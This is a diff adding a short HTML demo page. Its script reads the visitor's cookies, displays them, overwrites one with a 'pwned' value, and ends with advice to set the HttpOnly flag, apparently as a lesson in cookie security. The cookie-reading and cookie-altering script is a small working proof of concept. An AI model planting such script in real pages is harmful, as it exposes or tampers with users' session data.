@@ -1,0 +1,13 @@
+<html>
+    <div id="exploit"></div>
+    <script>
+        var exploit = document.getElementById("exploit");
+        exploit.innerHTML = "You cookie has been altered from <br><i>" + document.cookie + "</i><br>to";
+        document.cookie = "my_cookie = pwned; domain = cookies.gtfo.bar:1234";
+        exploit.innerHTML += "<br><i>" + document.cookie + "</i>";
+    </script>
+    <br>
+    <div id="cure">From now on don't forget to include <i>HttpOnly</i> flag in your <i>Set-Cookie</i> headers</div>
+    <br>
+    <a href="http://cookies.gtfo.bar:1234">Root</a>
+</html>
